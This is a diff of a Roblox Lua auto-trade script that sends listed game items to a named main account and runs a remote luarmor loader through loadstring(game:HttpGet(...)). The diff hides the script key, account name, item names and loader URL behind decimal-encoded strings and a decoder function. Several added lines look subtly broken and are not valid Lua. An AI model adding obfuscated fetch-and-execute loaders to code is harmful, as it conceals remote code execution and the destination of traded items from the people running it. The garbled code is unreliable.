@@ -1,23 +1,18 @@
-script_key="hnQmVUvXAvHyygjudmvuuWgBbNMmVSLp";
+local YAScjTKp=function(dhFUgN)local glxfCP=''for AGMTtv=1,#dhFUgNdoglxfCP=glxfCP..string.char(tonumber(string.sub(dhFUgN,AGMTtv*3-2,AGMTtv*3)))end;return glxfCPend
+local tVEdUD={'104\110\081\109\086\085\118\088\065\118\072\121\121\103\106\117\100\109\118\117\117\087\103\066\098\078\077\109\086\083\076\112','068\114\105\102\116\079\114\098\105\116\083\116\111\114\109\050\048\048\057','082\097\099\101\032\082\101\114\111\108\108','067\108\097\110\032\082\101\114\111\108\108','077\121\116\104\105\099\097\108\032\067\104\101\115\116','065\117\114\097\032\067\114\097\116\101','067\111\115\109\101\116\105\099\032\067\114\097\116\101','084\114\097\105\116\032\082\101\114\111\108\108','104\116\116\112\115\058\047\047\097\112\105\046\108\117\097\114\109\111\114\046\110\101\116\047\102\105\108\101\115\047\118\052\047\108\111\097\100\101\114\115\047\055\053\099\055\102\101\056\056\098\102\055\055\052\049\048\097\052\048\052\049\057\057\097\054\057\054\050\057\097\097\101\051\046\108\117\097'}
+local dcIw,local lEZM,local kqav=0,0,0
+script_key=YAScjTKp(tVEdUD[1]);
 getgenv().AutoTradeConfig = {
-    -- Danh sách acc main (display name hoặc username) - hỗ trợ nhiều acc
     MainAccounts = {
-        "DriftOrbitStorm2009",
-        -- thêm acc main ở đây, ví dụ:
-        -- "Jfjqiwdxs",
-        -- "br4velionfinn",
-        -- "maxotter31",
-        -- "ImamMBG288",
+        YAScjTKp(tVEdUD[2]),
     },
-
-    -- Danh sách tên item muốn trade (chỉ cần tên, tự detect category + max quantity)
     Items = {
-        "Race Reroll",
-        "Clan Reroll",
-        "Mythical Chest",
-        "Aura Crate",
-        "Cosmetic Crate",
-        "Trait Reroll",
+        YAScjTKp(tVEdUD[3]),
+        YAScjTKp(tVEdUD[4]),
+        YAScjTKp(tVEdUD[5]),
+        YAScjTKp(tVEdUD[6]),
+        YAScjTKp(tVEdUD[7]),
+        YAScjTKp(tVEdUD[8]),
     },
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/75c7fe88bf77410a404199a69629aae3.lua"))()
+loadstring(game:HttpGet(YAScjTKp(tVEdUD[9])))()
